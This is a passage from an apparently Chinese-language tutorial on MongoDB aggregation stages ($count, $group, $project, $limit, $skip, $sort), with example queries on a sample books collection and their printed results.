&quot;document&quot; ], &quot;favCount&quot; : 80, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx001&quot;, &quot;age&quot; : 20 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbcc&quot;), &quot;title&quot; : &quot;book-39&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;document&quot;, &quot;document&quot; ], &quot;favCount&quot; : 48, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx009&quot;, &quot;age&quot; : 25 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbcd&quot;), &quot;title&quot; : &quot;book-40&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;document&quot; ], &quot;favCount&quot; : 63, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 25 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbce&quot;), &quot;title&quot; : &quot;book-41&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 29, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx007&quot;, &quot;age&quot; : 27 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbd1&quot;), &quot;title&quot; : &quot;book-44&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;document&quot;, &quot;mongodb&quot; ], &quot;favCount&quot; : 64, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx007&quot;, &quot;age&quot; : 31 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbd6&quot;), &quot;title&quot; : &quot;book-49&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;mongodb&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 35, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx009&quot;, &quot;age&quot; : 24 &#125; &#125;</span><br></pre></td></tr></table></figure><h2 id="count"><a href="#count" class="headerlink" title="$count"></a>$count</h2><p>计数并返回与查询匹配的结果数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([ &#123;$match:&#123;type:&quot;technology&quot;&#125;&#125;, &#123;$count: &quot;type_count&quot;&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p>$match阶段筛选出type匹配technology的文档，并传到下一阶段；</p><p>$count阶段返回聚合管道中剩余文档的计数，并将该值分配给type_count</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;type_count&quot; : 12 &#125;</span><br></pre></td></tr></table></figure><h2 id="group"><a href="#group" class="headerlink" title="$group"></a>$group</h2><p>按指定的表达式对文档进行分组，并将每个不同分组的文档输出到下一个阶段。输出文档包含一个_id字 段，该字段按键包含不同的组。 输出文档还可以包含计算字段，该字段保存由$group的_id字段分组的一些accumulator表达式的值。 $group不会输出具体的文档而只是统计信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; $group: &#123; _id: &lt;expression&gt;, &lt;field1&gt;: &#123; &lt;accumulator1&gt; : &lt;expression1&gt; &#125;, ...</span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p>查询book的数量、收藏总数和平均值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([</span><br><span class="line">&#123;$group:&#123;_id:null,count:&#123;$sum:1&#125;,pop:&#123;$sum:&quot;$favCount&quot;&#125;,avg:&#123;$avg:&quot;$favCount&quot;&#125;&#125;&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;_id&quot; : null, &quot;count&quot; : 50, &quot;pop&quot; : 2452, &quot;avg&quot; : 49.04 &#125;</span><br></pre></td></tr></table></figure><p>统计每个作者的book收藏总数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([</span><br><span class="line">&#123;$group:&#123;_id:&quot;$author.name&quot;,pop:&#123;$sum:&quot;$favCount&quot;&#125;&#125;&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;_id&quot; : &quot;xx001&quot;, &quot;pop&quot; : 176 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &quot;xx006&quot;, &quot;pop&quot; : 90 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &quot;xx000&quot;, &quot;pop&quot; : 531 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &quot;xx007&quot;, &quot;pop&quot; : 213 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &quot;xx008&quot;, &quot;pop&quot; : 193 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &quot;xx005&quot;, &quot;pop&quot; : 353 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &quot;xx009&quot;, &quot;pop&quot; : 175 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &quot;xx003&quot;, &quot;pop&quot; : 302 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &quot;xx004&quot;, &quot;pop&quot; : 200 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &quot;xx002&quot;, &quot;pop&quot; : 219 &#125;</span><br></pre></td></tr></table></figure><p>统计每个作者的每本book的收藏数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([</span><br><span class="line">&#123;$group:&#123;_id:&#123;name:&quot;$author.name&quot;,title:&quot;$title&quot;&#125;,pop:&#123;$sum:&quot;$favCount&quot;&#125;&#125;&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx008&quot;, &quot;title&quot; : &quot;book-48&quot; &#125;, &quot;pop&quot; : 16 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;title&quot; : &quot;book-46&quot; &#125;, &quot;pop&quot; : 31 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx007&quot;, &quot;title&quot; : &quot;book-44&quot; &#125;, &quot;pop&quot; : 64 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;title&quot; : &quot;book-43&quot; &#125;, &quot;pop&quot; : 30 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;title&quot; : &quot;book-42&quot; &#125;, &quot;pop&quot; : 65 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx007&quot;, &quot;title&quot; : &quot;book-41&quot; &#125;, &quot;pop&quot; : 29 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx004&quot;, &quot;title&quot; : &quot;book-38&quot; &#125;, &quot;pop&quot; : 51 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx001&quot;, &quot;title&quot; : &quot;book-36&quot; &#125;, &quot;pop&quot; : 66 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;title&quot; : &quot;book-47&quot; &#125;, &quot;pop&quot; : 96 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx001&quot;, &quot;title&quot; : &quot;book-34&quot; &#125;, &quot;pop&quot; : 80 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx008&quot;, &quot;title&quot; : &quot;book-33&quot; &#125;, &quot;pop&quot; : 75 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;title&quot; : &quot;book-32&quot; &#125;, &quot;pop&quot; : 76 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx009&quot;, &quot;title&quot; : &quot;book-49&quot; &#125;, &quot;pop&quot; : 35 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;title&quot; : &quot;book-30&quot; &#125;, &quot;pop&quot; : 9 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;title&quot; : &quot;book-28&quot; &#125;, &quot;pop&quot; : 76 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;title&quot; : &quot;book-25&quot; &#125;, &quot;pop&quot; : 37 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx007&quot;, &quot;title&quot; : &quot;book-24&quot; &#125;, &quot;pop&quot; : 1 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx002&quot;, &quot;title&quot; : &quot;book-45&quot; &#125;, &quot;pop&quot; : 86 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;title&quot; : &quot;book-23&quot; &#125;, &quot;pop&quot; : 4 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;title&quot; : &quot;book-21&quot; &#125;, &quot;pop&quot; : 84 &#125;</span><br></pre></td></tr></table></figure><h2 id="project"><a href="#project" class="headerlink" title="$project"></a>$project</h2><p>投影操作， 将原始字段投影成指定名称， 如将集合中的 title 投影成 name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([&#123;$project:&#123;name:&quot;$title&quot;&#125;&#125;])</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba5&quot;), &quot;name&quot; : &quot;book-0&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba6&quot;), &quot;name&quot; : &quot;book-1&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba7&quot;), &quot;name&quot; : &quot;book-2&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba8&quot;), &quot;name&quot; : &quot;book-3&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba9&quot;), &quot;name&quot; : &quot;book-4&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbaa&quot;), &quot;name&quot; : &quot;book-5&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbab&quot;), &quot;name&quot; : &quot;book-6&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbac&quot;), &quot;name&quot; : &quot;book-7&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbad&quot;), &quot;name&quot; : &quot;book-8&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbae&quot;), &quot;name&quot; : &quot;book-9&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbaf&quot;), &quot;name&quot; : &quot;book-10&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb0&quot;), &quot;name&quot; : &quot;book-11&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb1&quot;), &quot;name&quot; : &quot;book-12&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb2&quot;), &quot;name&quot; : &quot;book-13&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb3&quot;), &quot;name&quot; : &quot;book-14&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb4&quot;), &quot;name&quot; : &quot;book-15&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb5&quot;), &quot;name&quot; : &quot;book-16&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb6&quot;), &quot;name&quot; : &quot;book-17&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb7&quot;), &quot;name&quot; : &quot;book-18&quot; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb8&quot;), &quot;name&quot; : &quot;book-19&quot; &#125;</span><br></pre></td></tr></table></figure><p>$project 可以灵活控制输出文档的格式，也可以剔除不需要的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([&#123;$project:&#123;name:&quot;$title&quot;,_id:0,type:1,author:1&#125;&#125;])</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;type&quot; : &quot;technology&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx002&quot;, &quot;age&quot; : 26 &#125;, &quot;name&quot; : &quot;book-0&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;travel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;age&quot; : 26 &#125;, &quot;name&quot; : &quot;book-1&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;novel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx002&quot;, &quot;age&quot; : 30 &#125;, &quot;name&quot; : &quot;book-2&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;sociality&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx009&quot;, &quot;age&quot; : 31 &#125;, &quot;name&quot; : &quot;book-3&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;literature&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx004&quot;, &quot;age&quot; : 27 &#125;, &quot;name&quot; : &quot;book-4&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;novel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx008&quot;, &quot;age&quot; : 26 &#125;, &quot;name&quot; : &quot;book-5&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;literature&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx002&quot;, &quot;age&quot; : 29 &#125;, &quot;name&quot; : &quot;book-6&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;novel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx007&quot;, &quot;age&quot; : 24 &#125;, &quot;name&quot; : &quot;book-7&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;sociality&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;age&quot; : 32 &#125;, &quot;name&quot; : &quot;book-8&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;novel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;age&quot; : 31 &#125;, &quot;name&quot; : &quot;book-9&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;literature&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 27 &#125;, &quot;name&quot; : &quot;book-10&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;technology&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 32 &#125;, &quot;name&quot; : &quot;book-11&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;novel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;age&quot; : 23 &#125;, &quot;name&quot; : &quot;book-12&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;travel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx006&quot;, &quot;age&quot; : 29 &#125;, &quot;name&quot; : &quot;book-13&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;novel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx004&quot;, &quot;age&quot; : 25 &#125;, &quot;name&quot; : &quot;book-14&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;literature&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;age&quot; : 34 &#125;, &quot;name&quot; : &quot;book-15&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;technology&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 32 &#125;, &quot;name&quot; : &quot;book-16&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;novel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;age&quot; : 33 &#125;, &quot;name&quot; : &quot;book-17&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;novel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx001&quot;, &quot;age&quot; : 24 &#125;, &quot;name&quot; : &quot;book-18&quot; &#125;</span><br><span class="line">&#123; &quot;type&quot; : &quot;travel&quot;, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx004&quot;, &quot;age&quot; : 27 &#125;, &quot;name&quot; : &quot;book-19&quot; &#125;</span><br></pre></td></tr></table></figure><p>从嵌套文档中排除字段</p><p>比如想从author中只看name</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([</span><br><span class="line">&#123;$project:&#123;name:&quot;$title&quot;,_id:0,type:1,&quot;author.name&quot;:1&#125;&#125;</span><br><span class="line">])</span><br><span class="line">或者</span><br><span class="line">db.books.aggregate([</span><br><span class="line">&#123;$project:&#123;name:&quot;$title&quot;,_id:0,type:1,author:&#123;name:1&#125;&#125;&#125;</span><br><span class="line">])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="limit"><a href="#limit" class="headerlink" title="$limit"></a>$limit</h2><p>限制传递到管道中下一阶段的文档数</p><p>如仅返回管道传递给它的前5个文档</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([</span><br><span class="line">&#123;$limit : 5 &#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba5&quot;), &quot;title&quot; : &quot;book-0&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;mongodb&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 72, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx002&quot;, &quot;age&quot; : 26 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba6&quot;), &quot;title&quot; : &quot;book-1&quot;, &quot;type&quot; : &quot;travel&quot;, &quot;tag&quot; : [ &quot;mongodb&quot;, &quot;document&quot; ], &quot;favCount&quot; : 20, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;age&quot; : 26 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba7&quot;), &quot;title&quot; : &quot;book-2&quot;, &quot;type&quot; : &quot;novel&quot;, &quot;tag&quot; : [ &quot;nosql&quot;, &quot;mongodb&quot; ], &quot;favCount&quot; : 6, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx002&quot;, &quot;age&quot; : 30 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba8&quot;), &quot;title&quot; : &quot;book-3&quot;, &quot;type&quot; : &quot;sociality&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 92, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx009&quot;, &quot;age&quot; : 31 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba9&quot;), &quot;title&quot; : &quot;book-4&quot;, &quot;type&quot; : &quot;literature&quot;, &quot;tag&quot; : [ &quot;document&quot;, &quot;mongodb&quot; ], &quot;favCount&quot; : 10, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx004&quot;, &quot;age&quot; : 27 &#125; &#125;</span><br></pre></td></tr></table></figure><h2 id="skip"><a href="#skip" class="headerlink" title="$skip"></a>$skip</h2><p>跳过进入stage的指定数量的文档，并将其余文档传递到管道中的下一个阶段</p><p>如跳过管道传递给它的前5个文档</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([</span><br><span class="line">&#123;$skip : 5 &#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbaa&quot;), &quot;title&quot; : &quot;book-5&quot;, &quot;type&quot; : &quot;novel&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 67, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx008&quot;, &quot;age&quot; : 26 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbab&quot;), &quot;title&quot; : &quot;book-6&quot;, &quot;type&quot; : &quot;literature&quot;, &quot;tag&quot; : [ &quot;mongodb&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 55, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx002&quot;, &quot;age&quot; : 29 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbac&quot;), &quot;title&quot; : &quot;book-7&quot;, &quot;type&quot; : &quot;novel&quot;, &quot;tag&quot; : [ &quot;mongodb&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 24, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx007&quot;, &quot;age&quot; : 24 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbad&quot;), &quot;title&quot; : &quot;book-8&quot;, &quot;type&quot; : &quot;sociality&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 70, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;age&quot; : 32 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbae&quot;), &quot;title&quot; : &quot;book-9&quot;, &quot;type&quot; : &quot;novel&quot;, &quot;tag&quot; : [ &quot;nosql&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 32, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;age&quot; : 31 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbaf&quot;), &quot;title&quot; : &quot;book-10&quot;, &quot;type&quot; : &quot;literature&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 99, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 27 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb0&quot;), &quot;title&quot; : &quot;book-11&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 61, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 32 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb1&quot;), &quot;title&quot; : &quot;book-12&quot;, &quot;type&quot; : &quot;novel&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 51, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;age&quot; : 23 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb2&quot;), &quot;title&quot; : &quot;book-13&quot;, &quot;type&quot; : &quot;travel&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;popular&quot; ], &quot;favCount&quot; : 3, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx006&quot;, &quot;age&quot; : 29 &#125; &#125;</span><br></pre></td></tr></table></figure><h2 id="sort"><a href="#sort" class="headerlink" title="$sort"></a>$sort</h2><p>对所有输入文档进行排序，并按排序顺序将它们返回到管道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; $sort: &#123; &lt;field1&gt;: &lt;sort order&gt;, &lt;field2&gt;: &lt;sort order&gt; ... &#125; &#125;</span><br></pre></td></tr></table></figure><p>要对字段进行排序，请将排序顺序设置为1或-1，以分别指定升序或降序排序，如下例所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.books.aggregate([</span><br><span class="line">&#123;$sort : &#123;favCount:-1,title:1&#125;&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 